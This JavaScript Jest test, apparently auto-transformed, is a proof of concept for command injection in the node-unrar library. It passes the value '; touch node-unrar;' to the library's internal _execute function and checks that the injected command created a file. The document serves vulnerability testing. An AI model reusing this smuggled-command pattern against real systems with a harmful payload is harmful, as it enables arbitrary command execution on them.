const v33 = done => {
    const v18 = expect.assertions(2);
    v18;
    const Unrar = require('node-unrar');
    const fs = require('fs');
    const path = './node-unrar';
    try {
        const v19 = fs.existsSync(path);
        if (v19) {
            const v20 = fs.unlinkSync(path);
            v20;
            const v21 = console.log('File removed:', path);
            v21;
        }
    } catch (err) {
        const v22 = console.error(err);
        v22;
    }
    file_exist = fs.existsSync(path);
    const v23 = expect(file_exist);
    const v24 = v23.toBe(false);
    v24;
    try {
        var rar = new Unrar('/path/to/file.rar');
        const v25 = [];
        const v31 = function () {
            file_exist = fs.existsSync(path);
            const v26 = expect(file_exist);
            const v27 = v26.toBe(true);
            v27;
            const v29 = function (err) {
                const v28 = done();
                v28;
            };
            const v30 = fs.unlink(path, v29);
            v30;
        };
        const v32 = rar._execute(v25, '; touch node-unrar;', v31);
        v32;
    } catch (error) {
    }
};
const v34 = test('Remote code execution in node-unrar', v33);
v34;